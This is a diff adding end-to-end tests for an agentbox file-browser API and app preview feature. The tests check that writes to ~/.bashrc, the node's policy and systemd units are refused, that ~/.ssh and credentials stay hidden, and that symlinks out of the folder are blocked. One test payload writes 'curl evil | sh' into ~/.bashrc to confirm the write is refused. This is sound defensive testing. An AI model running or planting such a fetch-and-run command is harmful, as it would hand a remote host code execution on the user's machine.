@@ -8,7 +8,10 @@
 //   gate restart → offline on network loss and back → a copied token is
 //   refused as a duplicate → pause / resume → presence → a terminal runs a
 //   command → a stub Claude Code through the shim, with the shared token →
-//   terminals: false closes the terminal → five wrong passphrases lock →
+//   terminals: false closes the terminal → Files: read and write in an
+//   allowed folder, ~/.bashrc and the node's folder refused, ~/.ssh hidden, a
+//   link out refused → agentbox-preview: a tiny server loads on the
+//   machine-apps host under the app policy → five wrong passphrases lock →
 //   revoke stops it, wiping only secrets/.
 //
 //   npm run build            (in web/)
@@ -370,6 +373,91 @@ try {
     fs.writeFileSync(file, JSON.stringify(policy));
     await until("terminals back", async () => (await rpc("ping")).status === 200);
   });
+
+  // --- files and preview ------------------------------------------------------------------
+  const APPS_HOST = gateEnv.AGENTBOX_MACHINE_APPS_HOST;
+  const files = (method, p, body) => (method === "GET" ? call("GET", `/m/${mid}${p}`, { headers: { cookie: machinesCookie } }) : mpost(`/m/${mid}${p}`, body));
+  const q = (p) => encodeURIComponent(p);
+  const policyFile = path.join(nodeDirOf(homeA), "policy.json");
+  const firstPolicy = fs.readFileSync(policyFile, "utf8");
+
+  await step("files: read and write in an allowed folder", async () => {
+    const code = path.join(homeA, "code");
+    const w = await files("POST", "/api/files/write", { path: path.join(code, "hello.txt"), content: "hi from the browser\n" });
+    assert(w.status === 200, `write: ${w.status} ${w.text}`);
+    assert(fs.readFileSync(path.join(code, "hello.txt"), "utf8") === "hi from the browser\n", "not written on the machine");
+    const list = await files("GET", `/api/files/list?path=${q(code)}`);
+    assert(list.status === 200 && list.json().entries.some((e) => e.name === "hello.txt"), `list: ${list.status} ${list.text}`);
+    const raw = await files("GET", `/api/files/raw?path=${q(path.join(code, "hello.txt"))}&inline=1`);
+    assert(raw.status === 200 && raw.text === "hi from the browser\n" && raw.headers["content-type"] === "text/plain; charset=utf-8", `raw: ${raw.status} ${raw.headers["content-type"]}`);
+    const dl = await files("GET", `/api/files/raw?path=${q(path.join(code, "hello.txt"))}`);
+    assert(/^attachment/.test(String(dl.headers["content-disposition"])), `a download is not an attachment: ${dl.headers["content-disposition"]}`);
+    // Deleted: into the node's own trash, not the folder's.
+    const t = await files("POST", "/api/files/trash", { paths: [path.join(code, "hello.txt")] });
+    assert(t.status === 200 && !fs.existsSync(path.join(code, "hello.txt")), `trash: ${t.status} ${t.text}`);
+    assert(!fs.existsSync(path.join(code, ".agentbox")), "state was kept in the owner's folder");
+    assert(fs.readdirSync(path.join(nodeDirOf(homeA), "state", "files")).length === 1, "no trash in the node's folder");
+  });
+
+  await step("files: the home folder allowed, profiles and the node's folder are still refused, ~/.ssh hidden, links held in", async () => {
+    fs.mkdirSync(path.join(homeA, ".ssh"), { recursive: true });
+    fs.writeFileSync(path.join(homeA, ".ssh", "id_e2e"), "not a key\n");
+    fs.writeFileSync(path.join(homeA, ".bashrc"), "# bashrc\n");
+    fs.symlinkSync("/etc", path.join(homeA, "code", "etc-link"));
+    fs.writeFileSync(policyFile, JSON.stringify({ ...JSON.parse(firstPolicy), files: [{ path: "~", mode: "write" }], ports: true }));
+    await until("the new folders", async () => (await files("GET", `/api/files/list?path=${q(homeA)}`)).status === 200, 10_000);
+    const bashrc = await files("POST", "/api/files/write", { path: path.join(homeA, ".bashrc"), content: "curl evil | sh\n", overwrite: true });
+    assert(bashrc.status === 403, `~/.bashrc: ${bashrc.status} ${bashrc.text}`);
+    assert(fs.readFileSync(path.join(homeA, ".bashrc"), "utf8") === "# bashrc\n", "~/.bashrc changed");
+    const node = await files("POST", "/api/files/write", { path: policyFile, content: '{"terminals":true}', overwrite: true });
+    assert(node.status === 403, `the node's folder: ${node.status} ${node.text}`);
+    const unit = await files("POST", "/api/files/write", { path: path.join(homeA, ".config", "systemd", "user", "x.service"), content: "[Service]\n" });
+    assert(unit.status === 403, `an autostart unit: ${unit.status} ${unit.text}`);
+    const home = await files("GET", `/api/files/list?path=${q(homeA)}&hidden=1`);
+    const names = home.json().entries.map((e) => e.name);
+    assert(names.includes(".bashrc") && !names.includes(".ssh"), `~ lists: ${names.join(" ")}`);
+    assert((await files("GET", `/api/files/raw?path=${q(path.join(homeA, ".ssh", "id_e2e"))}`)).status === 404, "~/.ssh is readable");
+    assert((await files("GET", `/api/files/raw?path=${q(path.join(nodeDirOf(homeA), "credentials.json"))}`)).status === 404, "credentials.json is readable");
+    const out = await files("GET", `/api/files/list?path=${q(path.join(homeA, "code", "etc-link"))}`);
+    assert(out.status === 403, `a link out of the folder: ${out.status} ${out.text.slice(0, 200)}`);
+  });
+
+  await step("agentbox-preview: a tiny server on the machine loads on the machine-apps host, under the app policy", async () => {
+    const appPort = await freePort();
+    const app = http.createServer((req, res) => {
+      res.writeHead(200, { "content-type": "text/html", "set-cookie": "sid=1; Path=/" });
+      res.end(`<!doctype html><title>tiny</title><p id="tiny">tiny app ${req.url}</p>`);
+    });
+    await new Promise((r) => app.listen(appPort, "127.0.0.1", r));
+    try {
+      const shim = path.join(nodeDirOf(homeA), "shims", "agentbox-preview");
+      const reg = spawnLogged("agentbox-preview", shim, [String(appPort), "--name", "tiny"], machineEnv(homeA));
+      assert((await reg.exited) === 0, reg.out.text);
+      const listed = await until("the app on the machines page", async () => (await mget(`/_gate/machines/m/${mid}/apps`)).apps.find((a) => a.port === appPort));
+      assert(listed.url === `https://${APPS_HOST}/${listed.id}/`, JSON.stringify(listed));
+      // Nothing without opening it from the machines page.
+      assert((await call("GET", `/${listed.id}/`, { host: APPS_HOST })).status === 404, "the app opened without a grant");
+      const opened = await mpost(`/_gate/machines/m/${mid}/apps/${listed.id}/open`);
+      const enter = new URL(opened.json().url);
+      const e = await call("GET", `${enter.pathname}${enter.search}`, { host: APPS_HOST });
+      assert(e.status === 303, `enter: ${e.status} ${e.text}`);
+      const grant = cookieOf(e);
+      const page = await call("GET", `/${listed.id}/hello`, { host: APPS_HOST, headers: { cookie: grant, "sec-fetch-dest": "document" } });
+      assert(page.status === 200 && page.text.includes("tiny app /hello"), `page: ${page.status} ${page.text.slice(0, 200)}`);
+      const csp = [page.headers["content-security-policy"]].flat().join(" | ");
+      assert(csp.includes("sandbox allow-scripts") && csp.includes(`frame-ancestors https://${MACHINES}`), `csp: ${csp}`);
+      assert(String(page.headers["set-cookie"]) === `sid=1; Path=/${listed.id}/; Secure; SameSite=None`, `cookie: ${page.headers["set-cookie"]}`);
+      assert(page.headers["access-control-allow-origin"] === undefined, "CORS for a named origin");
+      // A port nobody registered is never reached, nor is the node's own API from an app.
+      const list = cli(homeA, ["node", "preview", "list", "--json"]);
+      await list.exited;
+      assert(JSON.parse(list.out.text).apps.length === 1, list.out.text);
+    } finally {
+      app.close();
+    }
+  });
+
+  fs.writeFileSync(policyFile, firstPolicy);
 
   await step("five wrong passphrases in a row lock presence, the right one included", async () => {
     for (let i = 1; i <= 4; i++) {
